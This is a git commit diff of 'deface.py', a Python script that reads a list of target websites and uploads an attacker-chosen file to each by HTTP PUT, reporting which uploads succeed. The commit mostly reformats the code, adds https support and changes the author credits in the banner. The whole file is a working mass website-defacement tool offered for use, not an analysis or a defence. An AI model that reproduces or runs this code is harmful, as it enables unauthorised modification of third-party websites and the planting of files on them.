c51d10d280a9133a0b66b0d3f4cfc0fa9ad8132a
Abyputra <davineeditz@gmail.com>
2025-09-07 13:17:17 +0700

    Update deface.py

--- deface.py
+++ deface.py
@@ -1,19 +1,17 @@
-#-*- coding: utf-8 -*-
+# -*- coding: utf-8 -*-
 
 try:
-   import requests
-   import os.path
-   import sys
+    import requests
+    import os
+    import sys
 except ImportError:
-   exit("install requests and try again ...")
+    exit("install requests and try again ...")
 
 banner = """
-
-Github : /Hideyoshi07
-Youtube: Rama ahmed
+Github : /putraoffc
+Youtube: putraoffc2
 Author Ver AOX /official: Ms.ambari
 Github Ms.ambari: /Ranginang67
-
 """
 
 b = '\033[31m'
@@ -21,50 +19,48 @@ h = '\033[32m'
 m = '\033[00m'
 
 def x(tetew):
-   ipt = ''
-   if sys.version_info.major > 2:
-      ipt = input(tetew)
-   else:
-      ipt = raw_input(tetew)
-   
-   return str(ipt)
+    if sys.version_info.major > 2:
+        return str(input(tetew))
+    else:
+        return str(raw_input(tetew))
 
-def aox(script,target_file="target.txt"):
-   op = open(script,"r").read()
-   with open(target_file, "r") as target:
-      target = target.readlines()
-      s = requests.Session()
-      print("uploading file to %d website"%(len(target)))
-      for web in target:
-         try:
-            site = web.strip()
-            if site.startswith("http://") is False:
-               site = "http://" + site
-            req = s.put(site+"/"+script,data=op)
-            if req.status_code < 200 or req.status_code >= 250:
-               print(m+"["+b+"FAILED!"+m+" ] %s/%s"%(site,script))
-            else:
-               print(m+"["+h+"SUCCESS"+m+" ] %s/%s"%(site,script))
+def aox(script, target_file="target.txt"):
+    op = open(script, "r").read()
+    with open(target_file, "r") as target:
+        target = target.readlines()
+        s = requests.Session()
+        print("uploading file to %d website" % (len(target)))
+        for web in target:
+            try:
+                site = web.strip()
+                if not site.startswith("http://") and not site.startswith("https://"):
+                    site = "http://" + site
+                req = s.put(site + "/" + script, data=op)
+                if req.status_code < 200 or req.status_code >= 250:
+                    print(m + "[" + b + "FAILED!" + m + " ] %s/%s" % (site, script))
+                else:
+                    print(m + "[" + h + "SUCCESS" + m + " ] %s/%s" % (site, script))
 
-         except requests.exceptions.RequestException:
-            continue
-         except KeyboardInterrupt:
-            print; exit()
+            except requests.exceptions.RequestException:
+                continue
+            except KeyboardInterrupt:
+                print()
+                exit()
 
 def main(__bn__):
-   print(__bn__)
-   while True:
-      try:
-         a = x("Nama script lu: ")
-         if not os.path.isfile(a):
-            print("file '%s' not found"%(a))
-            continue
-         else:
-            break
-      except KeyboardInterrupt:
-         print; exit()
-
-   aox(a)
+    print(__bn__)
+    while True:
+        try:
+            a = x("Nama script lu: ")
+            if not os.path.isfile(a):
+                print("file '%s' not found" % (a))
+                continue
+            else:
+                break
+        except KeyboardInterrupt:
+            print()
+            exit()
+    aox(a)
 
 if __name__ == "__main__":
     main(banner)
